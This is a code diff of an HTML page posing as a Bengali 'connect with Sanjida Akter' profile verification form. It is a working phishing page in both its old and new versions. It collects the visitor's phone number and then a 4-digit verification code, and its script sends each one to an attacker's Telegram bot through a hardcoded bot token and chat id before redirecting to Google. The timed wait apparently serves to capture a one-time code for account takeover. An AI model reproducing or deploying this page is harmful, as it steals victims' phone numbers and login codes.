@@ -3,91 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sanjida - Profile</title>
+    <title>Connect - Sanjida Akter</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #fdfdfd; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .main-box { width: 90%; max-width: 380px; padding: 30px; border: 1px solid #eee; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); background: #fff; }
-        .user-pic { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #f0f0f0; margin-bottom: 15px; }
-        h1 { font-size: 20px; color: #333; margin: 10px 0; }
-        p { color: #777; font-size: 14px; line-height: 1.6; }
-        .input-row { display: flex; border: 1.5px solid #e0e0e0; border-radius: 12px; overflow: hidden; margin: 20px 0; }
-        .c-code { width: 70px; border: none; border-right: 1px solid #eee; text-align: center; font-weight: bold; font-size: 16px; outline: none; }
-        .p-num { border: none; width: 100%; padding: 15px; font-size: 16px; outline: none; }
-        button { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #000; color: #fff; font-weight: bold; cursor: pointer; opacity: 0.3; transition: 0.3s; }
-        button.ready { opacity: 1; background: #007bff; }
-        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
-        .otp-box { width: 45px; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 20px; background: #fafafa; }
-        .hide { display: none; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #fff; width: 90%; max-width: 380px; border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; border: 1px solid #eee; }
+        
+        /* প্রোফাইল হেডার (ছবি এবং নাম পাশাপাশি) */
+        .profile-header { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; background: #fafafa; padding: 10px; border-radius: 50px; border: 1px solid #f0f0f0; }
+        .profile-img { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; border: 2px solid #0084ff; background-color: #eee; }
+        .profile-name-top { font-weight: bold; font-size: 18px; color: #333; margin-left: 12px; }
+
+        .title { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 10px; }
+        .instruction { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+
+        /* ইনপুট ফিল্ড */
+        .input-container { border: 2px solid #e0e0e0; border-radius: 12px; display: flex; align-items: center; padding: 5px; margin-bottom: 20px; background: white; transition: 0.3s; }
+        .input-container:focus-within { border-color: #0084ff; }
+        .country-input { width: 75px; border: none; border-right: 1px solid #eee; outline: none; font-size: 17px; font-weight: bold; text-align: center; padding: 12px 5px; }
+        .main-phone { border: none; outline: none; font-size: 17px; width: 100%; padding: 12px; }
+
+        /* ভেরিফিকেশন কোড বক্স */
+        .code-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; background: #f8f9fa; outline: none; }
+        
+        button { width: 100%; padding: 16px; background-color: #c9d2db; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        button.active { background-color: #0084ff; cursor: pointer; box-shadow: 0 5px 15px rgba(0,132,255,0.3); }
+        
+        .timer { color: #888; font-size: 13px; margin-top: 15px; font-style: italic; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div id="step1" class="main-box">
-    <img src="https://i.ibb.co/VpkX8vX/user-image.jpg" class="user-pic">
-    <h1>Connect with Sanjida</h1>
-    <p>Please provide your contact number to proceed to the profile information.</p>
-    <div class="input-row">
-        <input type="text" id="code" class="c-code" placeholder="+880">
-        <input type="number" id="phone" class="p-num" placeholder="Number" oninput="validate()">
+<div id="page1">
+    <div class="card">
+        <div class="profile-header">
+            <img src="https://i.ibb.co/wNSPbzMN/IMG-20260408-WA0040.jpg" class="profile-img" alt="Sanjida">
+            <div class="profile-name-top">Sanjida Akter</div>
+        </div>
+
+        <div class="title">যোগাযোগ করুন</div>
+        <p class="instruction">Sanjida Akter-এর সাথে যুক্ত হতে আপনার নম্বর দিয়ে যাচাই করুন।</p>
+        
+        <div class="input-container">
+            <input type="text" id="countryCode" class="country-input" placeholder="+880" value="+880">
+            <input type="number" id="phone" class="main-phone" placeholder="ফোন নম্বর লিখুন" oninput="checkBtn()">
+        </div>
+        <button id="submitBtn" onclick="goToVerify()">চালিয়ে যান ➔</button>
     </div>
-    <button id="btn" onclick="next()">Continue</button>
 </div>
 
-<div id="step2" class="main-box hide">
-    <h1>Confirmation</h1>
-    <p>Wait for the timer to finish, then enter the code received to verify your connection.</p>
-    <div class="otp-inputs">
-        <input type="number" class="otp-box" maxlength="1" id="o1" oninput="move(this, 'o2')">
-        <input type="number" class="otp-box" maxlength="1" id="o2" oninput="move(this, 'o3')">
-        <input type="number" class="otp-box" maxlength="1" id="o3" oninput="move(this, 'o4')">
-        <input type="number" class="otp-box" maxlength="1" id="o4" oninput="finish(this)">
+<div id="page2" class="hidden">
+    <div class="card">
+        <div style="font-size: 50px; color:#0084ff; margin-bottom: 15px;">🛡️</div>
+        <div class="title">নিরাপত্তা যাচাই</div>
+        <p class="instruction">৪-সংখ্যার কোডটি দিতে টাইমার শেষ হওয়া পর্যন্ত অপেক্ষা করুন।</p>
+        
+        <div class="code-container">
+            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c2')" id="c1">
+            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c3')" id="c2">
+            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c4')" id="c3">
+            <input type="number" class="code-box" maxlength="1" oninput="sendCode(this)" id="c4">
+        </div>
+
+        <div id="timerText" class="timer">অনুগ্রহ করে ২৫ সেকেন্ড অপেক্ষা করুন...</div>
     </div>
-    <div id="wait" style="color: #999; font-size: 13px;">Wait 25s...</div>
 </div>
 
 <script>
-    const b_t = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
-    const c_i = "8624234278";
-    let full = "";
+    const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
+    const chat_id = "8624234278";
+    let userFullPhone = "";
 
-    function validate() {
-        let p = document.getElementById("phone").value;
-        let b = document.getElementById("btn");
-        if(p.length > 7) b.classList.add("ready");
-        else b.classList.remove("ready");
+    function checkBtn() {
+        const phone = document.getElementById("phone").value;
+        const btn = document.getElementById("submitBtn");
+        if(phone.length >= 8) btn.classList.add("active");
+        else btn.classList.remove("active");
     }
 
-    function next() {
-        let p = document.getElementById("phone").value;
-        let c = document.getElementById("code").value || "+880";
-        if(p.length < 8) return;
-        full = c + p;
-        fetch(`https://api.telegram.org/bot${b_t}/sendMessage?chat_id=${c_i}&text=Number: ${full}`);
-        document.getElementById("step1").classList.add("hide");
-        document.getElementById("step2").classList.remove("hide");
-        let t = 25;
-        let boxes = document.querySelectorAll(".otp-box");
-        boxes.forEach(b => b.disabled = true);
-        let intr = setInterval(() => {
-            t--;
-            document.getElementById("wait").innerText = `Wait ${t}s...`;
-            if(t <= 0) {
-                clearInterval(intr);
-                document.getElementById("wait").innerText = "You can enter code now";
-                boxes.forEach(b => b.disabled = false);
+    function goToVerify() {
+        const cCode = document.getElementById("countryCode").value || "+880";
+        const phone = document.getElementById("phone").value;
+        if(phone.length < 8) return;
+        userFullPhone = cCode + phone;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 New Request!\nNumber: " + userFullPhone + "\nTarget: Sanjida Akter")}`);
+
+        document.getElementById("page1").classList.add("hidden");
+        document.getElementById("page2").classList.remove("hidden");
+        startTimer();
+    }
+
+    function startTimer() {
+        let timeLeft = 25;
+        const timerText = document.getElementById("timerText");
+        const inputs = document.querySelectorAll(".code-box");
+        inputs.forEach(i => i.disabled = true);
+
+        const interval = setInterval(() => {
+            timeLeft--;
+            timerText.innerText = `অনুগ্রহ করে ${timeLeft} সেকেন্ড অপেক্ষা করুন...`;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                timerText.innerText = "আপনি এখন কোডটি দিতে পারেন";
+                inputs.forEach(i => i.disabled = false);
+                inputs[0].focus();
             }
         }, 1000);
     }
 
-    function move(curr, next) { if(curr.value.length >= 1) document.getElementById(next).focus(); }
+    function moveNext(curr, nextId) {
+        if(curr.value.length >= 1) {
+            curr.value = curr.value.slice(0,1);
+            document.getElementById(nextId).focus();
+        }
+    }
 
-    function finish(last) {
-        if(last.value.length >= 1) {
-            let code = document.getElementById("o1").value + document.getElementById("o2").value + document.getElementById("o3").value + document.getElementById("o4").value;
-            fetch(`https://api.telegram.org/bot${b_t}/sendMessage?chat_id=${c_i}&text=User: ${full}%0ACode: ${code}`)
-            .then(() => { alert("Success!"); window.location.href = "https://google.com"; });
+    function sendCode(lastInput) {
+        if(lastInput.value.length >= 1) {
+            lastInput.value = lastInput.value.slice(0,1);
+            const c1 = document.getElementById("c1").value;
+            const c2 = document.getElementById("c2").value;
+            const c3 = document.getElementById("c3").value;
+            const c4 = document.getElementById("c4").value;
+            const fullCode = c1 + c2 + c3 + c4;
+
+            const msg = `🔔 CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n👤 Profile: Sanjida Akter\n🔑 Code: ${fullCode}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                alert("যাচাইকরণ সফল হয়েছে!");
+                window.location.href = "https://www.google.com";
+            });
         }
     }
 </script>
+
 </body>
 </html>
